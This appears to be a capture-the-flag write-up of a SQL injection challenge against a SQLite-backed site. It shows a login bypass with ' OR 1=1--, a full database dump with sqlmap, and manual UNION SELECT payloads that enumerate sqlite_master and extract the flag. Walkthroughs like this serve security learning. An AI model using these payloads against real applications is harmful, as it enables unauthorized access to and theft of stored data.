To log in, we can enter 

# Automated

```
' OR 1=1--

```
for both fields. Not logging in will show the query, which allows us to see why this payload works.


To dump the database, I intercepted a search request in burp and saved it to `search.req`

I then used sqlmap to dump the database:

```
sqlmap -r search.req --dbms=sqlite --dump-all
```

# Manual

We can see that the output is three columns.

To get the sqlite version, we can write something like:

```sql
Algiers' UNION ALL SELECT sqlite_version(),NULL,NULL --
```

This places the sqlite version in the first column and then NULL in the last two.

To get the database schema, I tried doing 

```sql
' UNION ALL SELECT sql FROM sqlite_schema,NULL,NULL --
```
based on [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) cheat sheet.
Unfortunately, this didn't work, which I assume is because of sql permissions.

However, we can still get the schema using

```sql
' UNION ALL SELECT tbl_name,NULL,NULL FROM sqlite_master--
```

We can see that there are the following tables:
1. users
1. offices
1. hints
1. more_table

We can then get the columns in each table as so:

```sql
' UNION ALL SELECT sql,NULL,NULL FROM sqlite_master--
```

Based on this, we know that the `more_table` table as a `flag` column

To get the flag, we can enter:

```sql
' UNION ALL SELECT flag,NULL,NULL FROM more_table--
```
